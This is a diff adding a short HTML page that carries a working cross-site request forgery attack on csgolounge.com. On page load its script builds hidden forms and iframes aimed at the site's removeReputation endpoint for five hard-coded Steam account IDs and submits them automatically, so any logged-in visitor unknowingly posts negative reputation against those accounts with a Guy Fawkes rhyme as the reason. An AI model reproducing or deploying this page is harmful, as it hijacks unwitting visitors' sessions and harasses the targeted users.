@@ -1,0 +1,28 @@
+<html>
+<head>
+
+</head>
+<body>
+    <div id="placeholder"></div>
+    <script type="text/javascript">
+        var rep = {"76561197992873350": "negative", "76561198038862866": "negative", "76561197983600912": "negative", "76561198033008732": "negative", "76561198053191512": "negative"};
+        var dirtyShit = '<form action="http://csgolounge.com/ajax/removeReputation.php" target="{frame}" method="post" id="{id}">' +
+                '<input type="hidden" name="id" value="{id}"/>' +
+                '<input type="hidden" name="reason" value="Remember, remember the 5th of November. The gunpowder treason and plot. I know of no reason why the gunpowder treason should ever be forgot."/>' +
+                '</form>' +
+                '<iframe name="{frame}" src="http://csgolounge.com/ajax/removeReputation.php"></iframe>';
+        for (var key in rep) {
+            var profileNumber = key;
+            var newDirtyShit = dirtyShit;
+            newDirtyShit = newDirtyShit.replace(/{frame}/ig, profileNumber);
+            newDirtyShit = newDirtyShit.replace(/{id}/ig, profileNumber);
+            document.getElementById("placeholder").innerHTML += newDirtyShit;
+        }
+        document.addEventListener('DOMContentLoaded', function(){
+            for(i = 0; i < document.getElementsByTagName("form").length; i++) {
+                document.getElementsByTagName("form")[i].submit();
+            }
+        });
+        </script>
+</body>
+</html>
